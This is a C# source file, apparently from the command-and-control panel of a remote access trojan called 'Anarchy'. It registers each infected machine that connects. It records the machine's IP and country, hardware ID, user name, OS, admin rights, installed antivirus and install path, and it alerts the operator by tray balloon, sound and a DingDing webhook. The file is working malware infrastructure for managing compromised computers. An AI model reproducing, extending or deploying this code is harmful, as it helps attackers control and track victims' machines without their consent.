using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;
using Anarchy.Helpers.Helper;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;
using Anarchy.Properties;
using Settings = Anarchy.Helpers.Settings;

namespace Anarchy.Handlers
{
    public class HandleListView
    {
        public void AddToListview(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                lock (Settings.LockBlocked)
                {
                    try
                    {
                        if (Settings.Blocked.Count > 0)
                        {
                            if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
                            {
                                client.Disconnected();
                                return;
                            }
                            if (Settings.Blocked.Contains(client.Ip))
                            {
                                client.Disconnected();
                                return;
                            }
                        }
                    }
                    catch
                    {
                    }
                }
                client.LV = new ListViewItem
                {
                    Tag = client,
                    Text = $"{client.Ip}:{client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}"
                };
                try
                {
                    string[] array;
                    array = Program.form1.cGeoMain.GetIpInf(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]).Split(':');
                    client.LV.SubItems.Add(array[1]);
                    try
                    {
                        client.LV.ImageKey = array[2] + ".png";
                    }
                    catch
                    {
                    }
                }
                catch
                {
                    client.LV.SubItems.Add("??");
                }
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
                try
                {
                    client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Install_ed").AsString).ToLocalTime().ToString());
                }
                catch
                {
                    try
                    {
                        client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install_ed").AsString);
                    }
                    catch
                    {
                        client.LV.SubItems.Add("??");
                    }
                }
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
                client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Anti_virus").AsString);
                client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine;
                ListViewItem lV;
                lV = client.LV;
                lV.ToolTipText = lV.ToolTipText + "[Paste_bin] " + unpack_msgpack.ForcePathObject("Paste_bin").AsString;
                client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
                client.LV.UseItemStyleForSubItems = false;
                Program.form1.Invoke((MethodInvoker)delegate
                {
                    lock (Settings.LockListviewClients)
                    {
                        Program.form1.listView1.Items.Add(client.LV);
                        Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
                    }
                    if (Properties.Settings.Default.Notification)
                    {
                        Program.form1.notifyIcon1.BalloonTipText = "Connected \n" + client.Ip + " : " + client.TcpClient.LocalEndPoint.ToString().Split(':')[1];
                        Program.form1.notifyIcon1.ShowBalloonTip(100);
                        if (Properties.Settings.Default.DingDing && Properties.Settings.Default.WebHook != null && Properties.Settings.Default.Secret != null)
                        {
                            try
                            {
                                DingDing.Send(content: "Client " + client.Ip + " connected\nGroup:" + unpack_msgpack.ForcePathObject("Group").AsString + "\nUser:" + unpack_msgpack.ForcePathObject("User").AsString + "\nOS:" + unpack_msgpack.ForcePathObject("OS").AsString + "\nUser:" + unpack_msgpack.ForcePathObject("Admin").AsString, WebHook: Properties.Settings.Default.WebHook, secret: Properties.Settings.Default.Secret);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show(ex.Message);
                            }
                        }
                    }
                    new HandleLogs().Addmsg("Client " + client.Ip + " connected", Color.Green);
                    if (TimeZoneInfo.Local.Id == "China Standard Time" && Properties.Settings.Default.Notification)
                    {
                        SoundPlayer soundPlayer;
                        soundPlayer = new SoundPlayer(Resources.online);
                        soundPlayer.Load();
                        soundPlayer.Play();
                    }
                });
            }
            catch
            {
            }
        }

        public void Received(Clients client)
        {
            try
            {
                lock (Settings.LockListviewClients)
                {
                    if (client.LV != null)
                    {
                        client.LV.ForeColor = Color.Empty;
                    }
                }
            }
            catch
            {
            }
        }
    }
}
